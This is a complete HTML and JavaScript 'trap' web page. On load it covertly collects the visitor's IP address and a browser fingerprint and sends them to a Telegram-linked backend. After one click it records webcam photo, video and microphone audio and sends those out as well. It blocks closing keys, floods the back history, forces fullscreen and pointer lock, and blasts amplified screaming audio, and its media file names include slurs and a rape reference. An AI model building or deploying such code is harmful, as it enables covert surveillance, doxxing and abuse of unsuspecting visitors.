<style>
* { 
    padding: 0; 
    margin: 0; 
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}

.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    z-index: 1000;
}

.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
    flex-shrink: 0;
}

.video-wrapper video,
.video-wrapper img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    top: 0;
}

.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    flex-shrink: 0;
}

.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
}

.click-overlay button {
    padding: 20px 40px;
    font-size: 20px;
    background: #fff;
    color: #000;
    border: none;
    border-radius: 0;
    cursor: pointer;
}

.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}

.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
}

.backg img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}
</style>
</head>
<body>

<!-- Overlay to start the experience -->
<div class="click-overlay" id="startOverlay">
    <button>ENTER</button>
</div>
<div class="black-screen"></div>

<!-- Audio loops -->
<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<!-- Visual content -->
<div class="video-container">
    <div class="video-wrapper">
        <img id="wads" src="wads.gif" alt="">
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
    </div>
</div>

<div class="backg"><img src="naggars.gif"></div>

<!-- jQuery (needed for some scripts) -->
<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- MAIN SCRIPT: Immediate ping + Inescapable trap + Full capture -->
<script>
(function() {
    // ================================================================
    // CONFIG
    // ================================================================
    const BACKEND_URL = '/api/telegram';  // must match server endpoint
    let hasTriggered = false;
    const ORIGINAL_WIDTH = 640;
    const ORIGINAL_HEIGHT = 480;

    // ================================================================
    // 1. IP INFO (silent, no gesture)
    // ================================================================
    async function getIP() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            if (!res.ok) throw new Error('ipapi failed');
            return await res.json();
        } catch (e) {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return { ip: data.ip, source: 'ipify' };
            } catch (err) {
                return { error: 'IP unobtainable' };
            }
        }
    }

    // ================================================================
    // 2. DEVICE / BROWSER FINGERPRINT (full details)
    // ================================================================
    function getFingerprint() {
        const fp = {};
        fp.userAgent = navigator.userAgent;
        fp.language = navigator.language;
        fp.platform = navigator.platform;
        fp.hardwareConcurrency = navigator.hardwareConcurrency || '?';
        fp.deviceMemory = navigator.deviceMemory || '?';
        fp.maxTouchPoints = navigator.maxTouchPoints || '?';
        fp.screen = {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio
        };
        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // Canvas fingerprint
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
            ctx.fillStyle = '#f60'; ctx.fillRect(0,0,200,50);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
            ctx.fillStyle = 'rgba(102,204,0,0.7)';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
            fp.canvas = canvas.toDataURL();
        } catch(e) { fp.canvas = 'error'; }

        // WebGL
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if(gl) {
                fp.webgl = {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER)
                };
            } else {
                fp.webgl = 'unsupported';
            }
        } catch(e) { fp.webgl = 'error'; }

        return fp;
    }

    // ================================================================
    // 3. SEND TO BACKEND (with retry)
    // ================================================================
    async function sendToBackend(ipData, fingerprint, photo, video, mic) {
        const payload = {
            ipData,
            fingerprint,
            photo: photo || null,
            video: video || null,
            mic: mic || null,
            timestamp: new Date().toISOString()
        };
        try {
            const res = await fetch(BACKEND_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!res.ok) console.warn('[PING] Backend error:', await res.text());
        } catch(e) {
            console.warn('[PING] send failed, retrying in 2s');
            setTimeout(() => sendToBackend(ipData, fingerprint, photo, video, mic), 2000);
        }
    }

    // ================================================================
    // 4. ⚡ IMMEDIATE PING (NO CLICK) – runs on page load
    // ================================================================
    async function sendImmediateInfo() {
        console.log('[PING] Fetching IP + fingerprint...');
        const [ip, fp] = await Promise.all([getIP(), Promise.resolve(getFingerprint())]);
        console.log('[PING] Sending to Telegram');
        await sendToBackend(ip, fp, null, null, null);
    }

    // ================================================================
    // 5. FULL CAPTURE (WEBAM & MIC) – triggered after click
    // ================================================================
    async function captureWebcamPhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { width:{ideal:640}, height:{ideal:480} } });
            const vid = document.createElement('video');
            vid.srcObject = stream;
            await vid.play();
            await new Promise(r => setTimeout(r,200));
            const canvas = document.createElement('canvas');
            canvas.width = vid.videoWidth || 640;
            canvas.height = vid.videoHeight || 480;
            canvas.getContext('2d').drawImage(vid,0,0,canvas.width,canvas.height);
            stream.getTracks().forEach(t => t.stop());
            return canvas.toDataURL('image/jpeg',0.8);
        } catch(e) { return null; }
    }

    async function captureWebcamVideo() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { width:{ideal:640}, height:{ideal:480} }, audio:false });
            const mr = new MediaRecorder(stream, { mimeType:'video/mp4' });
            const chunks = [];
            mr.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
            return new Promise(resolve => {
                mr.onstop = () => {
                    const blob = new Blob(chunks, { type:'video/mp4' });
                    const reader = new FileReader();
                    reader.onloadend = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(t => t.stop());
                };
                mr.start();
                setTimeout(() => mr.stop(), 3000);
            });
        } catch(e) { return null; }
    }

    async function captureMic() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio:true });
            const mr = new MediaRecorder(stream);
            const chunks = [];
            mr.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
            return new Promise(resolve => {
                mr.onstop = () => {
                    const blob = new Blob(chunks, { type:'audio/wav' });
                    const reader = new FileReader();
                    reader.onloadend = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(t => t.stop());
                };
                mr.start();
                setTimeout(() => mr.stop(), 3000);
            });
        } catch(e) { return null; }
    }

    async function runFullExfiltration() {
        const [ip, fp, photo, video, mic] = await Promise.all([
            getIP(),
            Promise.resolve(getFingerprint()),
            captureWebcamPhoto(),
            captureWebcamVideo(),
            captureMic()
        ]);
        await sendToBackend(ip, fp, photo, video, mic);
    }

    // ================================================================
    // 6. INESCAPABLE TRAP – impossible to leave
    // ================================================================
    function trapUser() {
        // Block all key combos that could close/leave
        const blockKeys = e => {
            const key = e.key;
            const ctrl = e.ctrlKey, alt = e.altKey, shift = e.shiftKey, meta = e.metaKey;
            if (
                e.keyCode === 115 || // F4
                e.keyCode === 116 || // F5
                (ctrl && key === 'w') ||
                (ctrl && key === 'W') ||
                (ctrl && key === 't') ||
                (ctrl && key === 'T') ||
                (ctrl && key === 'n') ||
                (ctrl && key === 'N') ||
                (ctrl && shift && key === 'T') ||
                (alt && key === 'F4') ||
                (alt && key === 'Tab') ||
                (ctrl && key === 'Tab') ||
                (alt && key === 'ArrowLeft') ||
                (alt && key === 'ArrowRight') ||
                (meta && key === 'q') // Cmd+Q (Mac)
            ) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        };

        document.addEventListener('keydown', blockKeys, true);
        document.addEventListener('keyup', blockKeys, true);
        document.addEventListener('keypress', blockKeys, true);

        // Prevent right-click, selection, drag
        document.addEventListener('contextmenu', e => e.preventDefault(), true);
        document.addEventListener('selectstart', e => e.preventDefault(), true);
        document.addEventListener('dragstart', e => e.preventDefault(), true);

        // Disable close attempt
        window.close = () => { console.warn('close blocked'); };

        // History flood – back button useless
        for(let i=0; i<50; i++) history.pushState(null, null, location.href);
        window.onpopstate = () => {
            history.pushState(null, null, location.href);
            attemptFullscreen();
            lockPointer();
        };

        // Beforeunload nag
        window.onbeforeunload = () => {
            return 'You cannot leave.';
        };

        // Keep fullscreen and pointer lock active
        setInterval(() => {
            if (!hasTriggered) return;
            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                attemptFullscreen();
            }
            if (document.pointerLockElement === null) {
                lockPointer();
            }
        }, 200);

        const reengage = () => {
            if (!hasTriggered) return;
            if (!document.fullscreenElement && !document.webkitFullscreenElement) attemptFullscreen();
            if (document.pointerLockElement === null) lockPointer();
        };
        ['mousemove','click','touchstart','keydown'].forEach(ev => {
            document.addEventListener(ev, reengage, true);
        });
        document.addEventListener('fullscreenchange', reengage);
        document.addEventListener('webkitfullscreenchange', reengage);
        document.addEventListener('pointerlockchange', reengage);
        document.addEventListener('mozpointerlockchange', reengage);
        document.addEventListener('webkitpointerlockchange', reengage);
    }

    function attemptFullscreen() {
        const el = document.documentElement;
        try {
            if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
            else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
            else if (el.msRequestFullscreen) el.msRequestFullscreen();
        } catch(e){}
    }

    function lockPointer() {
        try {
            document.body.requestPointerLock();
        } catch(e){}
    }

    // ================================================================
    // 7. AUDIO BOOST & START EXPERIENCE (ORIGINAL)
    // ================================================================
    let audioContext, gainNode;
    const mediaElements = [];

    function initAudioBoost() {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        gainNode = audioContext.createGain();
        gainNode.gain.value = 10;
        gainNode.connect(audioContext.destination);
        ['shart','shart2','shart3'].forEach(id => {
            const el = document.getElementById(id);
            if(el) {
                mediaElements.push(el);
                const src = audioContext.createMediaElementSource(el);
                src.connect(gainNode);
                el.loop = true; el.muted = false;
            }
        });
        ['fart','ronnie'].forEach(id => {
            const el = document.getElementById(id);
            if(el) {
                mediaElements.push(el);
                const src = audioContext.createMediaElementSource(el);
                src.connect(gainNode);
                el.loop = true; el.muted = false;
            }
        });
    }

    function playAllMedia() {
        if(audioContext && audioContext.state === 'suspended') audioContext.resume();
        mediaElements.forEach(m => {
            if(m) {
                m.volume = 1.0; m.muted = false;
                const p = m.play();
                if(p) p.catch(() => setInterval(() => m.play(), 100));
            }
        });
    }

    window.startExperience = function() {
        if(hasTriggered) return;
        hasTriggered = true;

        document.getElementById('startOverlay').style.display = 'none';
        document.querySelector('.black-screen').style.display = 'none';

        initAudioBoost();
        playAllMedia();
        attemptFullscreen();
        lockPointer();
        trapUser();

        // Full capture now (inside user gesture)
        runFullExfiltration().catch(console.warn);
    };

    document.getElementById('startOverlay').addEventListener('click', startExperience);

    // ================================================================
    // 8. FIRE IMMEDIATE PING – as soon as page loads
    // ================================================================
    console.log('[PING] Page loaded – sending immediate info...');
    sendImmediateInfo().catch(console.warn);

    // Start trapping immediately (even before click)
    trapUser();
})();
</script>
</body>
</html>
